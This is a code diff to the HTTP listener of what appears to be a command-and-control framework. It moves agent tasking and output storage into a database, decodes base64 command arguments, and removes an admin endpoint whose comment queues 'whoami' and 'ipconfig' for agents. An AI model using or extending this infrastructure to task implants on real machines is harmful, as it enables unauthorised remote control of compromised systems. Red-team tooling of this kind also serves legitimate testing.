@@ -9,15 +9,17 @@ import json
 from datetime import datetime
 from libs.agents.agent import *
 from libs.utils.utils import *
+from libs.utils.db_commands import *
 
 class HTTP_Handler:
 
-    def __init__(self,port:int,host:str,ssl:bool,active:bool,admin_key:str|None=None,secret_key:str|None=None,agents_using_listener:list|None=None)->object:
+    def __init__(self,port:int,host:str,ssl:bool,active:bool,db_path:str,admin_key:str|None=None,secret_key:str|None=None,agents_using_listener:list|None=None)->object:
         self.port = port
         self.host = host
         self.ssl = ssl
         self.listener = None
         self.active = active
+        self.db_path = db_path
         self.secret_key = secret_key or base64.b64encode(base64.a85encode(b"token-"+"".join([random.choice("azertyuiopmlkjhgfdsqwxcvbn1234567890AZERTYUIOPMLKJHGFDSQWXCVBN") for _ in range(random.randint(25,30))]).encode())).decode()
         self.admin_key = admin_key or base64.b64encode(base64.a85encode(b"token-"+"".join([random.choice("azertyuiopmlkjhgfdsqwxcvbn1234567890AZERTYUIOPMLKJHGFDSQWXCVBN!?-_/\\$") for _ in range(random.randint(30,50))]).encode())).decode()
         self.agents_using_listener = agents_using_listener or []
@@ -68,12 +70,11 @@ class HTTP_Handler:
                         if agent.id == agent_id:
                             agent_connected = True
                             agent.last_seen = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-                            if len(agent.command_queue)>0:
-                                command_to_run = agent.command_queue.pop(0)
-                                command_to_run = json.dumps(command_to_run)
+                            command_to_run = self.get_commands_by_agent_id(agent_id)
+                            if command_to_run:
+                                return json.dumps(command_to_run)
                             else:
-                                command_to_run = ""
-                            return command_to_run
+                                return ""
                     if not agent_connected:
                         return "registration_error"
                                
@@ -87,8 +88,11 @@ class HTTP_Handler:
                     agent_id = request.headers.get("Identifier")
                     for agent in self.agents_using_listener:
                         if agent.id == agent_id:
-                            data = request.get_data().decode()
-                            agent.output_file.append(data)
+                            data = request.json
+                            task_id = data["task_id"]
+                            db_exec(add_output_to_task(task_id,data["output"]),self.db_path)
+                            db_exec(set_job_finished(task_id),self.db_path)
+                            #agent.output_file.append(data)
                             return ""
 
             return ""
@@ -104,21 +108,6 @@ class HTTP_Handler:
                     else:
                         return ""
             return ""
-        
-        @listener.route("/execute_command",methods=["POST"])
-        def execute():
-            if self._is_admin_authorization_valid(request.headers):
-                all_agents = {agent.id:agent for agent in self.agents_using_listener}
-                data = request.get_data()
-                data = json.loads(data) # {"azerty1":[{"method":"run","arguments":["whoami"]},{"method":"run","arguments":["ipconfig"]}]} OLD
-                for agent_id in data.keys():
-                    if agent_id in all_agents.keys():
-                        commands = data[agent_id]
-                        for command in commands:
-                            all_agents[agent_id].exec_command(command)
-                return "True"
-                        
-            return "False"
 
         @listener.route("/get_agents")
         def display():
@@ -143,6 +132,15 @@ class HTTP_Handler:
         else:
             self.listener.run(host=self.host,port=self.port)
     
+    def get_commands_by_agent_id(self,agent_id:str):
+        first_command = db_exec(get_tasked_job_for_agent(agent_id),self.db_path)
+        if len(first_command)!=0:
+            first_command = first_command[0]
+            db_exec(set_job_running(first_command[0]),self.db_path)
+        else:
+            return False
+        return {"task_id":first_command[0],"method":first_command[2],"arguments":base64.b64decode(first_command[3].encode()).decode()}
+
     def stop_listener(self)->None:
         self.active = False
     
